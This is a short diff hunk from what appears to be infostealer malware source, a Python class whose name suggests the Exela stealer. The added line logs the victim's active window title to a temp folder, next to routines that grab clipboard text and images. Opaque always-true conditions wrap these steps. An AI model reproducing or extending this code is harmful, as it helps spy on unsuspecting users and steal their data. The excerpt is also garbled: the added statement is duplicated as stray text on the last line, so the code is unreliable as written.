@@ -899,6 +899,7 @@ class QuicaxdExela:
             if 0 < 1:
                 active_window_title = self.get_active_window_title()
                 with open(tmp + f"\\{run}\\active_window.txt", "a", encoding="utf-8", errors="ignore") as x:
+                    x.write(str(active_window_title))
             if 5 > 4:
                 self.get_last_clipboard_text(run)
                 self.get_last_clipboard_image(run)        x.write(str(active_window_title))
